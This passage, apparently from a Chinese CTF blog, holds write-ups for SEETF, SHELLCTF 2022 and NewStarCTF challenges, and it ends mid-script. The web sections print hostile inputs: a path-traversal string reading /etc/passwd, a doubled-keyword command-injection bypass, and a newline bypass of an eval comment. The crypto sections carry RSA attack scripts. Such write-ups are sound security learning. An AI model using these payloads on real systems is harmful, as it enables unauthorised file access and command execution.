    <url>/2022/06/04/SEETF/</url>
    <content><![CDATA[<p>今天一天打了几个国外的比赛，这个比赛直接给我打自闭了，web就会一题，我是fw。。。</p>
<p><img src="https://z4a.net/images/2022/06/10/imagec81257c0e3c4ef50.png" alt="imagec81257c0e3c4ef50.png"></p>
<span id="more"></span>
<h1 id="web">web</h1>
<h2 id="sourceless-guessy-web-baby-flag">Sourceless Guessy Web (Baby Flag)</h2>
<blockquote>
<p>WHY SO SERIOUS? WHY NEED SOURCE?</p>
<p>Contrary to the title of this challenge, you do not need to guess. As usual, do not bruteforce or scan our infrastructure, it is not allowed.</p>
<p><strong>Note:</strong> There are two flags for this challenge.</p>
<p><a href="http://sourcelessguessyweb.chall.seetf.sg:1337/">http://sourcelessguessyweb.chall.seetf.sg:1337</a></p>
<p>For beginners:</p>
<ul>
<li><a href="https://portswigger.net/web-security/file-path-traversal">https://portswigger.net/web-security/file-path-traversal</a></li>
</ul>
</blockquote>
<p><img src="https://z4a.net/images/2022/06/04/image.png" alt="image.png"></p>
<p>目录遍历漏洞<code>../../../etc/passwd</code>,看源码得到flag</p>
<p><img src="https://z4a.net/images/2022/06/04/image34e14558ea6901bd.png" alt="image34e14558ea6901bd.png"></p>
<h1 id="misc">MISC</h1>
<h2 id="regex101">Regex101</h2>
<blockquote>
<p>Our team stored a flag on our machine, however, we were hacked by someone, and he generated 2999 flags and hid our original flag in the .txt file. The flag consists of 5 uppercase letters, followed by 5 digits and another 6 uppercase letters. Can you find it for us?</p>
</blockquote>
<p>签到题，一个一个找自然能找到，但是学到了一个新的<a href="https://regexr.com/">方法</a></p>
<p>直接使用</p>
<pre><code class="hljs plaintext">SEE&#123;[A-Z]&#123;5&#125;\d&#123;5&#125;[A-Z]&#123;6&#125;&#125;</code></pre>
<p>即可找到flag<img src="https://z4a.net/images/2022/06/10/image.png" alt="image.png"></p>
<pre><code class="hljs plaintext">SEE&#123;RGSXG13841KLWIUO&#125;</code></pre>
]]></content>
      <categories>
        <category>赛后复盘</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>赛后复盘</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>SHELLCTF 2022</title>
    <url>/2022/08/14/SHELLCTF%202022/</url>
    <content><![CDATA[<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208132207964.png?x-oss-process=hzy" alt="image-20220813220717895"></p>
<span id="more"></span>
<h1 id="misc">Misc</h1>
<h2 id="worlds-greatest-detective">World’s Greatest Detective</h2>
<blockquote>
<p>Are you the World’s greatest detective?if yes help us decode this image and we shall reward you with the thing you truly desire. Flag Format: SHELLCTF{}</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208122148138.png?x-oss-process=hzy" alt="image-20220812214842025"></p>
<p>漫威里面黑豹的语言，在线翻译一下</p>
<p><a href="https://typewakanda.com/">Type Wakanda is a Wakanda Text Translator that turns your English text to Wakanda Font</a></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208122149176.png?x-oss-process=hzy" alt="image-20220812214920106"></p>
<p>SHELLCTF{W4kandA_F0rev3r}</p>
<h2 id="sanity-check">Sanity Check</h2>
<blockquote>
<p>Check the #announcement channel of the discord server .</p>
</blockquote>
<p>SHELLCTF{W3lc0me_2_SHELLCTF2022}</p>
<h1 id="reversing">Reversing</h1>
<h2 id="how-to-defeat-a-dragon">How to defeat a dragon</h2>
<blockquote>
<p>Dragonairre,the dragon with the hexadecimal head has attacked the village to take revenge on his last defeat,we need to get the ultimate weapon. Flag Format : SHELLCTF{}.</p>
</blockquote>
<p>主要逻辑如下</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208122233009.png?x-oss-process=hzy" alt="image-20220812223302909"></p>
<p>SHELLCTF{5348454c4c4354467b31355f523376337235316e675f333473793f7d}</p>
<p>交了不对，发现内容是hex，转str</p>
<p>SHELLCTF{15_R3v3r51ng_34sy?}</p>
<h2 id="keygen">Keygen</h2>
<blockquote>
<p>Enter the license key and get the flag.Simple right ? Flag Format:SHELLCTF{}.</p>
</blockquote>
<p>主要逻辑如下</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208122235225.png?x-oss-process=hzy" alt="image-20220812223533154"></p>
<p>发现v3是flag，跟进getstring(),得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208122238871.png?x-oss-process=hzy" alt="image-20220812223841804"></p>
<p>SHELLCTF{k3ygen_1s_c0oL}</p>
<h2 id="pulling-the-strings">Pulling the strings</h2>
<blockquote>
<p>Can you please feed me something? Flag Format: SHELLCTF{}</p>
</blockquote>
<p>主要逻辑如下</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208122240548.png?x-oss-process=hzy" alt="image-20220812224023474"></p>
<p>跟进</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208122241636.png?x-oss-process=hzy" alt="image-20220812224122563"></p>
<p>继续跟进，得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208122241044.png?x-oss-process=hzy" alt="image-20220812224146972"></p>
<p>SHELLCTF{Th4nks_f0r_the_food}</p>
<h2 id="warmup">warmup</h2>
<blockquote>
<p>Here’s a quick rev challenge to get started. Reverse the binary to obtain the flag.</p>
<p>The flag format is shellctf{…}</p>
</blockquote>
<p>主要逻辑如下</p>
<h1 id="forensics">Forensics</h1>
<h2 id="alien-communication">Alien Communication</h2>
<blockquote>
<p>Aliens are trying to communicate something. They belive in seeing more than what they are hearing. can you help us trying to decode what they are trying to say?</p>
</blockquote>
<p>wav音频隐写，看频谱图得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208122318379.png?x-oss-process=hzy" alt="image-20220812231849286"></p>
<p>shell{y0u_g07_7h3_f1ag}</p>
<h2 id="go-deep">GO Deep!</h2>
<blockquote>
<p>Our one of the agent gave us this file and said “Go Deep!”</p>
</blockquote>
<p>附件一堆阴间音，Go Deep，使用这个软件</p>
<p><a href="http://jpinsoft.net/DeepSoundInstalled.aspx">Deepsoundinstalled | jpinsoft.net</a></p>
<p>密码是shell，得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208131445356.png?x-oss-process=hzy" alt="image-20220813144533282"></p>
<p>SHELL{y0u_w3r3_7h1nk1ng_R3ally_D33p}</p>
<h2 id="heaven">Heaven</h2>
<blockquote>
<p>“I was in the seventh heaven painted red green and blue”</p>
<p>Flag Format: SHELL{s0mething_here}</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208131746308.jpeg?x-oss-process=hzy" alt="Seventh_Heaven_Image"></p>
<p>红绿蓝7通道，出flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208131746143.png?x-oss-process=hzy" alt="image-20220813174638083"></p>
<p>SHELL{man1pul4t1ng_w1th_ 31ts_15_3A5y}</p>
<h2 id="hidden-file">Hidden File</h2>
<blockquote>
<p>Our Agent gave us this image can you find whats there with this image?</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208131849558.jpg?x-oss-process=hzy" alt="Hidden"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208131849906.png?x-oss-process=hzy" alt="image-20220813184941843"></p>
<p>steghide隐写</p>
<pre><code class="hljs plaintext">steghide extract -sf  Hidden.jpg -p shell</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208141727348.png?x-oss-process=hzy" alt="image-20220814172701272"></p>
<p>分出了一个压缩包，解压之后<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208141727709.png?x-oss-process=hzy" alt="image-20220814172736658"></p>
<h1 id="web">Web</h1>
<h2 id="choosy">Choosy</h2>
<blockquote>
<p>Single solution doesn’t works on all problems. One should try different solutions for different problem.</p>
<p>Flag format:- shellctf{H3re_1s_tH3_F14g}</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208131426169.png?x-oss-process=hzy" alt="image-20220813142637051"></p>
<p>试了ssti貌似不是，那就是xss</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208131427920.png?x-oss-process=hzy" alt="image-20220813142736844"></p>
<p>shellctf{50oom3_P4yL0aDS_aM0ng_Maaa4nnY}</p>
<h2 id="doc-holder">Doc Holder</h2>
<blockquote>
<p>Can you share portable document with us which looks like it when we seet portable document with eyes but ti’s not actually portable document.</p>
<p>More a misc problem …</p>
<p>My Favourite move is Inferno overwrite</p>
</blockquote>
<blockquote>
<p>Hint — Challenge is all about file extension of the file that you are uploading…</p>
<p>Think from right to left</p>
</blockquote>
<p>文件上传题，测试貌似只能上传pdf</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208131516982.png?x-oss-process=hzy" alt="image-20220813151641870"></p>
<p>上传成功显示<strong>Yummmmmmmmmmyyyyy</strong>，上传失败显示<strong>Not Tasty</strong></p>
<h2 id="colour-cookie">Colour Cookie</h2>
<blockquote>
<p>Gone those days when no colours, images, fonts use to be on a webpage. We now have various ways to decorate our webpages and here is one such example.</p>
<p>Flag format :- shellctf{H3re_1s_F14g}</p>
</blockquote>
<blockquote>
<p>hint: The key is finding and value is the favorite thing…</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208131515235.png?x-oss-process=hzy" alt="image-20220813151542106"></p>
<p>没啥思路</p>
<h2 id="illusion">ILLUSION</h2>
<blockquote>
<p>Sometimes it happens things are there but you can’t see it directly. We need to change our vision to make it visible. I believe you have that vision.Flag is in flag.txt file…</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208132144804.png?x-oss-process=hzy" alt="image-20220813214429690"></p>
<p>输入的内容大部分都会被过滤</p>
<p>ls也不可以直接用，fuzz发现可以用的符号有#+.;ACDFGLSTXacdfglstx\u0026</p>
<p>llss列当前目录无flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208132146736.png?x-oss-process=hzy" alt="image-20220813214655640"></p>
<p>难点就在如何换目录</p>
<p>双写绕过</p>
<pre><code class="hljs plaintext">ccdd%20....;ccdd%20....;llss</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208132148172.png?x-oss-process=hzy" alt="image-20220813214832071"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208132149527.png?x-oss-process=hzy" alt="image-20220813214907447"></p>
<p>shellctf{F1l73R5_C4n’T_Pr3v3N7_C0mM4nd_1nJeC71on}</p>
<h1 id="crypto">Crypto</h1>
<h2 id="tring-tring">Tring Tring…</h2>
<blockquote>
<p>Tring Tring my mobile started ringing. “Hey Check your SMS!!”----. ----. ----. / -… -… -… / —… —… / …— …— …— / …— / -… -… / --… --… --… / …-- …-- / …— / …-- / -… / ----. ----. ----. / --… --… --… --… / -… / --… --… --… --…Flag Format: SHELL{SOMETHINGHERE}</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208131758670.png?x-oss-process=hzy" alt="image-20220813175855579"></p>
<pre><code class="hljs plaintext">999 666 88 2222 66 777 33 2 3 6 999  7777 6 7777

YOUANREADMYSMS

93 63 82 24 62 73 32 21 31 61 93 74 61 74

YOU_AN_READ_MY_SMS

youanreadmysms

SHELL&#123;YOUANREADMYSMS&#125;</code></pre>
<p>这样交一直不行，就奇了怪了</p>
<p>后来队友点醒梦中人，2222分222和2，前222为23，后21，则CA</p>
<p>所以最后答案为SHELL{YOUCANREADMYSMS}</p>
<h1 id="总结">总结</h1>
<p>这比赛质量不咋地，不想做了，就做这些吧，脑洞太大，没学到太多东西</p>
]]></content>
      <categories>
        <category>赛后复盘</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>赛后复盘</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>NewStarCTF</title>
    <url>/2022/09/27/NewStarCTF/</url>
    <content><![CDATA[<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291942964.png?x-oss-process=hzy" alt="image-20220929194254854"></p>
<span id="more"></span>
<h1 id="week1web">WEEK1|WEB</h1>
<h2 id="http">HTTP</h2>
<p>Get,post按要求传参，修改cookie得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291910357.png?x-oss-process=hzy" alt="image-20220929191001284"></p>
<h2 id="headheader">Head?Header!</h2>
<p>按要求就对了</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291914382.png?x-oss-process=hzy" alt="image-20220929191043868"></p>
<h2 id="我真的会谢">我真的会谢</h2>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291914753.png?x-oss-process=hzy" alt="image-20220929191451695"></p>
<p>扫目录即可，flag三部分三个目录，都敏感目录</p>
<p>Robots文件flag{Th1s_Is_s00</p>
<p>index.php.swp 0_e4sy_d0_y00</p>
<p><a href="http://www.zip">www.zip</a> u_th1nk_so?}</p>
<p>flag{Th1s_Is_s000_e4sy_d0_y00u_th1nk_so?}</p>
<h2 id="word-for-you">Word-For-You</h2>
<p>Sql注入</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291915178.png?x-oss-process=hzy" alt="image-20220929191516057"></p>
<p>flag{Th1s_is_0_simp1e_S0L_test}</p>
<h2 id="notphp">NotPHP</h2>
<pre><code class="hljs plaintext">这道题目难点就在eval(&quot;#&quot;.$_GET[&#x27;cmd&#x27;]);</code></pre>
<p>前面那一堆都是基操绕过，这个eval拼接刚开始有个注释符，导致后面的命令也不生效，是使用换行符绕过%0a,需要编码才行</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291915857.png?x-oss-process=hzy" alt="image-20220929191541794"></p>
<p>flag{35b52d41-2437-4bda-9e73-41477681c983}</p>
<h1 id="week1crypto">WEEK1|CRYPTO</h1>
<h2 id="caeser">Caeser</h2>
<p>Rot13解密</p>
<h2 id="吉奥万巴蒂斯塔贝拉索先生的密码">吉奥万·巴蒂斯塔·贝拉索先生的密码</h2>
<pre><code class="hljs plaintext">pqcq&#123;gteygpttmj_kc_zuokwv_kqb_gtofmssi_mnrrjt&#125;



Hint: key length is 3</code></pre>
<p>维吉尼亚密码 ，密钥是kfc</p>
<p>用这个在线网站<a href="https://guballa.de/vigenere-solver">Vigenere Solver - www.guballa.de</a></p>
<p>flag{bruteforce_is_useful_for_breaking_cipher}</p>
<h2 id="chaos">chaos</h2>
<pre><code class="hljs plaintext">def LC(key, x, times, flags):
    (k1, k2) = key
    xn = []
    xn.append(x)
    if flags:
        xn.append(1 - 2 * xn[0]**2)
    else:
        xn.append(k2 * xn[0]**3 + (1 - k2)*xn[0])
    for i in range(times):
        assert xn[i]&gt;=-1 and xn[i]&lt;=1 and xn[i+1]&gt;=-1 and xn[i+1]&lt;=1
        if flags:
            xn.append((1 - 2 * xn[i]**2)*(k1 * xn[i+1]**3 + (1 - k1)*xn[i+1]))
        else:
            xn.append((k2 * xn[i]**3 + (1 - k2)*xn[i])*(1 - 2 * xn[i+1]**2))
    return xn[times + 1]

sum, r = 0, 1

keyx= [107, 99, 55, 198, 210, 56, 137, 44, 127, 25, 150, 113, 75, 215, 187, 132]

for i in range(16):
    sum += keyx[i]
    r ^= keyx[i]

a_1 = (sum/256) % 1
timea1 = 3 + int(1000 * a_1) % 30
b_1 = (r/256)
timeb1 = 3 + int(1000 * b_1) % 30
xc_1 = a_1 * b_1
yc_1 = (a_1 + b_1) % 1

key=(3.967139695598587, 3.7926025078694305 )
data=(a_1, timea1, b_1, timeb1, xc_1, yc_1)
print(data)

res=[23, 84, 105, 111, 230, 105, 97, 50, 58, 61, 25, 97, 57, 21, 175, 77, 102, 138, 120, 17, 66, 172, 52, 178, 101, 221, 109, 126, 71, 149, 63, 32, 56, 6, 134, 255, 110, 57, 15, 20, 116]

(k1, k2) = key
(a_1, timea1, b_1, timeb1, xc_1, yc_1) = data
m, c = [], []
miu, omiga = [], []
ta = timea1
tb = timeb1

for i in range(0,41):
    for tmpx in range(20,127):
        mi = tmpx
        miu_tmp= LC(key, a_1, ta, 1)
        omiga_tmp=  LC(key, b_1, tb, 0)

        tmpres = ((int(miu_tmp * 1000) + int(omiga_tmp * 1000)) ^ mi) % 256
        if tmpres==res[i]:
            print(tmpx)
            delta = res[i]/256
            for i in range(3):
                y = (yc_1 + delta) % 1
                y = k1 * y**3 + (1 - k1) * y
                x = xc_1
                x = k2 * x**3 + (1 - k2) * x
            ta = 3 + int(1000 * x) % 30
            tb = 3 + int(1000 * y) % 30
            break
</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291916006.png?x-oss-process=hzy" alt="image-20220929191630974"></p>
<pre><code class="hljs plaintext">125对应ascii就是f，所以这就是flag
都解码一下
sum, r, k = 0, 1, [107, 99, 55, 198, 210, 56, 137, 44, 127, 25, 150, 113, 75, 215, 187, 132]  
k1,k2 = 3.967139695598587, 3.7926025078694305
for i in k:
    sum += i
    r ^= i
a_1 = (sum/256) % 1
timea1 = 3 + int(1000 * a_1) % 30
b_1 = (r/256)
timeb1 = 3 + int(1000 * b_1) % 30
xc_1 = a_1 * b_1
yc_1 = (a_1 + b_1) % 1
  
  
data = (a_1, timea1, b_1, timeb1, xc_1, yc_1)
  
  
key = (k1,k2)
  
  
print(key,data)
  
def LC(key, x, times, flags):
    (k1, k2) = key
    xn = []
    xn.append(x)
    if flags:
        xn.append(1 - 2 * xn[0]**2)
    else:
        xn.append(k2 * xn[0]**3 + (1 - k2)*xn[0])
    for i in range(times):
        assert xn[i]&gt;=-1 and xn[i]&lt;=1 and xn[i+1]&gt;=-1 and xn[i+1]&lt;=1
        if flags:
            xn.append((1 - 2 * xn[i]**2)*(k1 * xn[i+1]**3 + (1 - k1)*xn[i+1]))
        else:
            xn.append((k2 * xn[i]**3 + (1 - k2)*xn[i])*(1 - 2 * xn[i+1]**2))
    return xn[times + 1]
  
  
m, c = [], [23, 84, 105, 111, 230, 105, 97, 50, 58, 61, 25, 97, 57, 21, 175, 77, 102, 138, 120, 17, 66, 172, 52, 178, 101, 221, 109, 126, 71, 149, 63, 32, 56, 6, 134, 255, 110, 57, 15, 20, 116]
miu, omiga = [], []
ta = timea1
tb = timeb1
  
  
res = []
for flag in c:
    miu.append(LC(key, a_1, ta, 1))
    omiga.append(LC(key, b_1, tb, 0))
    res.append(((int(miu[-1] * 1000) + int(omiga[-1] * 1000))%256)^flag)
    delta = flag/256
    for i in range(3):
        y = (yc_1 + delta) % 1
        y = k1 * y**3 + (1 - k1) * y
        x = xc_1
        x = k2 * x**3 + (1 - k2) * x
    ta = 3 + int(1000 * x) % 30
    tb = 3 + int(1000 * y) % 30
print(res)
  
  
f = &quot;&quot;
for i in res:
    f += chr(i)
print(f)
  
flag&#123;ii24nji9-8ckkpil1-5hiev3n6-1u24g07m&#125;
这道题目第一周没写出来，看到的大佬的wp才明白，还是太菜了
</code></pre>
<h2 id="rsa_begin">RSA_begin</h2>
<p>一共有五个rsa，应该每个是一部分的flag</p>
<p>第一个是知道c,p,q,n求解</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291923676.png?x-oss-process=hzy" alt="image-20220929191757174"></p>
<pre><code class="hljs plaintext">import libnum
from Crypto.Util.number import long_to_bytes
 
c = 22160015525054597533062795679117215923801827397299805735087138192137742945881204146337349060934854888054628153923021387981306839951210090523829296521835965212118849043671673133979884712755090374758002677916820953359774554825569218497687506468472278309097929775388010403607769802840990547048001743970754496905
p = 6962443023774446497102092246794613339314677593117417573764609329949026862782472380488956732038459060928443992561763464365758383525259954798321350043810351
q = 9631855759661411029901156175243744760977799976661519182223576693685069000499866459636568713055906075171480855575061732016121299027658733834671035383233163
n = p*q
e = 65537
#e = int(&quot;&quot;,16)

 
d = libnum.invmod(e, (p - 1) * (q - 1))
m = pow(c, d, n)   # m 的十进制形式
string = long_to_bytes(m)  # m明文
print(string)  # 结果为 b‘ m ’ 的形式
</code></pre>
<p>flag{W0w_</p>
<p>第二个是知道n,c,e求解</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291923116.png?x-oss-process=hzy" alt="image-20220929192351055"></p>
<p>n分解素数p，q, <a href="http://factordb.com/index.php?query=134097988095851988085603926250918812377">factordb.com</a></p>
<p>p=10094271714305059493</p>
<p>q=13284562957208247589</p>
<p>然后用上面那个脚本出就行</p>
<pre><code class="hljs plaintext">import libnum
from Crypto.Util.number import long_to_bytes
 
c = 17250922799297131008803303235771955129
n = 134097988095851988085603926250918812377
#n = int(&quot;&quot;,16)
e = 65537
#e = int(&quot;&quot;,16)
p=10094271714305059493
q=13284562957208247589

 
d = libnum.invmod(e, (p - 1) * (q - 1))
m = pow(c, d, n)   # m 的十进制形式
string = long_to_bytes(m)  # m明文
print(string)  # 结果为 b‘ m ’ 的形式
</code></pre>
<p>U_ar3_re4</p>
<p>第三个也是给了n,c但是n的值很大</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291924815.png?x-oss-process=hzy" alt="image-20220929192421750"></p>
<p>E是3，n又很大，所以直接低指数加密攻击</p>
<p>因为e很小的话，明文m的e次方=密文c+kn，可以直接通过对c+kn开e次方根，返回能开e次方根的结果。</p>
<p>对k进行爆破，脚本如下</p>
<pre><code class="hljs plaintext">import gmpy2
import libnum

def de(c, e, n):
    k = 0
    while True:
        mm = c + n*k
        result, flag = gmpy2.iroot(mm, e)
        if True == flag:
            return result
        k += 1
e= 3
c = 2776571135646565181849912433877522437622755332262910824866791711
n = 85793694792655420934945863688968944466300304898903354212780512650924132933351787673979641944071634528676901506049360194331553838080226562532784448832916022442020751986591703547743056267118831445759258041047213294368605599719242059474324548598203039032847591828382166845797857139844445858881218318006747115157

m=de(c,e,n)
print(m)
print(libnum.n2s(int(m)).decode())

</code></pre>
<p>L1y_g0Od_</p>
<p><a href="https://blog.csdn.net/fengerxi33/article/details/123353560">(62条消息) CTF_RSA_低加密指数攻击脚本_风二西的博客-CSDN博客_ctf rsa脚本</a></p>
<p>第四部分e就很大了，这种使用渐进式分数把d爆破出来</p>
<pre><code class="hljs plaintext">import gmpy2
 
 
def transform(x, y):  # 使用辗转相处将分数 x/y 转为连分数的形式
    res = []
    while y:
        res.append(x // y)
        x, y = y, x % y
    return res
 
 
def continued_fraction(sub_res):
    numerator, denominator = 1, 0
    for i in sub_res[::-1]:  # 从sublist的后面往前循环
        denominator, numerator = numerator, i * numerator + denominator
    return denominator, numerator  # 得到渐进分数的分母和分子，并返回
 
 
# 求解每个渐进分数
def sub_fraction(x, y):
    res = transform(x, y)
    res = list(map(continued_fraction, (res[0:i] for i in range(1, len(res)))))  # 将连分数的结果逐一截取以求渐进分数
    return res
 
 
def get_pq(a, b, c):  # 由p+q和pq的值通过维达定理来求解p和q
    par = gmpy2.isqrt(b * b - 4 * a * c)  # 由上述可得，开根号一定是整数，因为有解
    x1, x2 = (-b + par) // (2 * a), (-b - par) // (2 * a)
    return x1, x2
 
 
def wienerAttack(e, n):
    for (d, k) in sub_fraction(e, n):  # 用一个for循环来注意试探e/n的连续函数的渐进分数，直到找到一个满足条件的渐进分数
        if k == 0:  # 可能会出现连分数的第一个为0的情况，排除
            continue
        if (e * d - 1) % k != 0:  # ed=1 (mod φ(n)) 因此如果找到了d的话，(ed-1)会整除φ(n),也就是存在k使得(e*d-1)//k=φ(n)
            continue
 
        phi = (e * d - 1) // k  # 这个结果就是 φ(n)
        px, qy = get_pq(1, n - phi + 1, n)
        if px * qy == n:
            p, q = abs(int(px)), abs(int(qy))  # 可能会得到两个负数，负负得正未尝不会出现
            d = gmpy2.invert(e, (p - 1) * (q - 1))  # 求ed=1 (mod  φ(n))的结果，也就是e关于 φ(n)的乘法逆元d
            return d
    print(&quot;该方法不适用&quot;)
 
 
e = 51999725233581619348238930320668315462087635295211755849675812266270026439521805156908952855288255992098479180003264827305694330542325533165867427898010879823017054891520626992724274019277478717788189662456052796449734904215067032681345261878977193341769514961038309763898052908572726913209883965288047452751
n = 68816697240190744603903822351423855593899797203703723038363240057913366227564780805815565183450516726498872118491739132110437976570592602837245705802946829337567674506561850972973663435358068441037127926802688722648016352967768929007662772115485020718202683004813042834036078650571763978066558718285783045969
d = wienerAttack(e, n)
print(&quot;d=&quot;, d)
</code></pre>
<p>得到d= 12966126097163765179</p>
<pre><code class="hljs plaintext">import gmpy2
import libnum

def continuedFra(x, y):
    &quot;&quot;&quot;计算连分数
    :param x: 分子
    :param y: 分母
    :return: 连分数列表
    &quot;&quot;&quot;
    cf = []
    while y:
        cf.append(x // y)
        x, y = y, x % y
    return cf
def gradualFra(cf):
    &quot;&quot;&quot;计算传入列表最后的渐进分数
    :param cf: 连分数列表
    :return: 该列表最后的渐近分数
    &quot;&quot;&quot;
    numerator = 0
    denominator = 1
    for x in cf[::-1]:
        # 这里的渐进分数分子分母要分开
        numerator, denominator = denominator, x * denominator + numerator
    return numerator, denominator
def solve_pq(a, b, c):
    &quot;&quot;&quot;使用韦达定理解出pq，x^2−(p+q)∗x+pq=0
    :param a:x^2的系数
    :param b:x的系数
    :param c:pq
    :return:p，q
    &quot;&quot;&quot;
    par = gmpy2.isqrt(b * b - 4 * a * c)
    return (-b + par) // (2 * a), (-b - par) // (2 * a)
def getGradualFra(cf):
    &quot;&quot;&quot;计算列表所有的渐近分数
    :param cf: 连分数列表
    :return: 该列表所有的渐近分数
    &quot;&quot;&quot;
    gf = []
    for i in range(1, len(cf) + 1):
        gf.append(gradualFra(cf[:i]))
    return gf

def wienerAttack(e, n):
    &quot;&quot;&quot;
    :param e:
    :param n:
    :return: 私钥d
    &quot;&quot;&quot;
    cf = continuedFra(e, n)
    gf = getGradualFra(cf)
    for d, k in gf:
        if k == 0: continue
        if (e * d - 1) % k != 0:
            continue
        phi = (e * d - 1) // k
        p, q = solve_pq(1, n - phi + 1, n)
        if p * q == n:
            return d

c = 68588738085497640698861260094482876262596289469248772328560280530093163764972313090939471997156632421517452790632223565521726590730640805290182026911025142051864898712501214753986865172996090706657535814234291235489829621372021092488300236623525366939477695283380634188510950335639019458758643273802572617191
e = 51999725233581619348238930320668315462087635295211755849675812266270026439521805156908952855288255992098479180003264827305694330542325533165867427898010879823017054891520626992724274019277478717788189662456052796449734904215067032681345261878977193341769514961038309763898052908572726913209883965288047452751
n = 68816697240190744603903822351423855593899797203703723038363240057913366227564780805815565183450516726498872118491739132110437976570592602837245705802946829337567674506561850972973663435358068441037127926802688722648016352967768929007662772115485020718202683004813042834036078650571763978066558718285783045969
d=wienerAttack(e, n)
m=pow(c, d, n)
print(type(d))
print(libnum.n2s(m).decode())
</code></pre>
<p>4t_m4th_4</p>
<p>第五部分给了c,hint,n</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291925923.png?x-oss-process=hzy" alt="image-20220929192518860"></p>
<p>n做了变形，不是俩个大素数直接相乘了</p>
<p>求p，q  ，p是n和(hint*e^e-1)的最大公约数,不会啊不会</p>
<p>后来发现facpord可以分解n为p，q，大意了</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291925400.png?x-oss-process=hzy" alt="image-20220929192532340"></p>
<p>得到</p>
<pre><code class="hljs plaintext">p=784744289113652780335906877235842706814379007511789871386409149315623611553214388731122686401322840674401468881626237323

2805140661188849984894717969091251

Q=125341176643729892325694094385902426153375396027156994334080777080596886614491929300892718911617005632257231379577780698
 86363333248734538990407281949985777

又e=65537

n = 1232865496850144050320992645475166723525103370117149219196294373695624167653495180701004894188767069545579706264513808335877905149818445940067870026924895990672091745229251935876434509430457142930654307044403355838663341948471348893414890261787326255632362887647279204029327042915224570484394917295606592360109952538313570951448278525753313335289675455996833500751672463525151201002407861423542656805624090223118747404488579783372944593022796321473618301206064979

c= 1135954814335407362237156338232840769700916726653557860319741136149066730262056907097728029957898420630256832277578506404721904131425822963948589774909272408535427656986176833063600681390871582834223748797942203560505159946141171210061405977060061656807175913366911284450695116982731157917343650021723054666494528470413522258995220648163505549701953152705111304471498547618002847587649651689203632845303117282630095814054989963116013144483037051076441508388998829</code></pre>
<p>所以flag是flag{W0w_U_ar3_re4L1y_g0Od_4t_m4th_4()}</p>
<p><a href="https://blog.csdn.net/weixin_53090346/article/details/126978929">(62条消息) BUUCTF NewStarCTF一些新知识记录_Aiwin-Lau的博客-CSDN博客</a></p>
<h2 id="eazyxor">Eazyxor</h2>
<p>异或，但是有随机数os.urandom(size)</p>
<p>**size:**它是字符串随机字节的大小</p>
<p>**返回值：**此方法返回一个字符串，该字符串表示适合加密用途的随机字节。</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209291926722.png?x-oss-process=hzy" alt="image-20220929192607616"></p>
<p>异或加密，异或两次就等于没异或，所以再异或一次</p>
<p>Key[0]是随机数，爆破一下</p>
<pre><code class="hljs plaintext">from os import urandom
import binascii
 
key = urandom(1)
 
 
def xor(plaintext, key):
    ret = []
    for i in range(len(plaintext)):
        ret.append(plaintext[i] ^ key)
    return bytes(ret)
 
 
global i
try:
    for i in range(150, 255):
